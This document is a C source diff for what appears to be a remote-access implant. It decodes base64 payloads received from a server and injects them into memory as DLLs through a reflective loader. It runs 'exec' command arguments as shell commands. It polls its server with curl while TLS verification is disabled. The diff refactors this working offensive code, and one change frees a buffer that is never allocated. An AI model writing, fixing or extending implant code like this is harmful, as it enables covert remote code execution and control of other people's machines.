@@ -26,32 +26,23 @@ char* CMD_gogo(char* args)
 {
     debugf("Received gogo command with arguments: %s\n", args);
     size_t gadget_len = 0;
-    unsigned char* gadget = base64_decode(args, strlen(args), &gadget_len);
     LPVOID lpBuffer = NULL;
     HANDLE hModule  = NULL;
+    unsigned char* gadget = base64_decode(args, strlen(args), &gadget_len);
 
     if (gadget == NULL)
     {
         return NULL;
     }
     
-    debugf("gadget: %p", gadget);
-    debugf("gadget length: %zu\n", gadget_len);
-    lpBuffer = VirtualAlloc(NULL, gadget_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if( !lpBuffer )
-    {
-        BREAK_WITH_ERROR( "Failed to allocate space" );
-    }
-
-    memcpy(lpBuffer, gadget, gadget_len);
-    debugf("memcpy\n");
-    fflush(stdout);
-
+    debugf("gadget: %p gadget length: %zu", gadget, gadget_len);
     CommandNodePointer func;
-    hModule = (HANDLE)ReflectiveLoader( lpBuffer, &func );
-    if( !hModule )
+    hModule = (HANDLE)ReflectiveLoader(gadget, &func);
+    if(!hModule)
     {
-        BREAK_WITH_ERROR( "Failed to inject the DLL" );
+        debugf("Failed to inject the DLL");
+        VirtualFree(lpBuffer, 0, MEM_RELEASE);
+        return NULL;
     }
     
     CommandNode* tester = func();
@@ -102,6 +93,7 @@ void check_response(char* data)
 
     if (commandnode != NULL)
     {
+        // If it's an `exec` command, the arguments (ie "ls -al") are the actual command
         if (!strcmp(commandnode->command, "exec"))
         {
             clientinfo.data_command = strdup(arguments);
@@ -227,8 +219,6 @@ char* make_header(const char* header, const char* data)
     {
         return NULL;
     }
-    debugf("Make header, header: %s\n", header);
-    debugf("Make header, data: %s\n", data);
     debugf("Make header, buffer: %s\n", buffer);
     return buffer;
 }
@@ -239,7 +229,6 @@ void command_loop(void)
 
     // Stuff that will need to be free'd
     CURL *curl = NULL;
-    unsigned char free_response = 0;
     chunk.memory = calloc(1,1);
 
     // Initialize the "chunk" used to receive data
@@ -266,7 +255,6 @@ void command_loop(void)
             debugf("sending response: %s\n", clientinfo.data_response);
             // Does not create a copy of data, so mark that it needs to be free'd
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, clientinfo.data_response);
-            free_response = 1;
             // Update headers with current command
             update_curl_headers();
         }
@@ -285,7 +273,6 @@ void command_loop(void)
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
 
         // Specify the callback function to handle the response data
-        // curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
 
@@ -294,11 +281,10 @@ void command_loop(void)
 
         // If sent a response, free the response and remove the command header
         // This happens here before we check the `current` response from server
-        if (free_response)
+        if (clientinfo.data_response)
         {
             SAFE_FREE(clientinfo.data_response);
             SAFE_FREE(clientinfo.data_command);
-            free_response = 0;
             update_curl_headers();
         }
 
